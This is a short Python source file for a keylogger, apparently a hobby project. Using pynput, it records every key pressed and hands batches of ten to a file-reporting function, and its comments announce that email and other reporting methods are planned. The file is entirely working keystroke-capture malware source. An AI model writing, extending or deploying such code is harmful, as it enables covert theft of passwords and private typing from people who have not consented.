# Simple Keylogger, which can save pressed keys to a file.
# Other methods for logging/reporting will be added soon.

__author__ = 'xXP3RPL3Xx'
__version__ = 0.0

from pynput.keyboard import Key, Listener

from report_methods import report_to_file


class Keylogger:
    """Represents a simple Keylogger."""

    def __init__(self, time_interval: int, report_method) -> None:
        self.interval: int  = time_interval
        self.report_method = report_method
        self.keys = list()
        self.count = 0

    def reset_log(self) -> None:
        """Resets the keys in the key list."""
        self.keys = []

    def report(self) -> None:
        """
        Report the keys to email,file, etc.
        functional Strategy Pattern for the report method
        """
        self.report_method(self.keys)
        self.reset_log()

    def on_press(self, key: Key) -> None:
        """Specify what happens when a key is pressed."""
        self.count += 1
        self.keys.append(key)
        if self.count == self.interval:
            self.report()
            self.count = 0

    @staticmethod
    def on_release(key) -> None:
        """Stop listening when Escape is pressed."""
        if key == Key.esc:
            return False

    def run(self) -> None:
        """Start the Keylogger."""
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()


def main():
    file_report = report_to_file

    keylogger = Keylogger(10, file_report)

    keylogger.run()


if __name__ == '__main__':
    main()
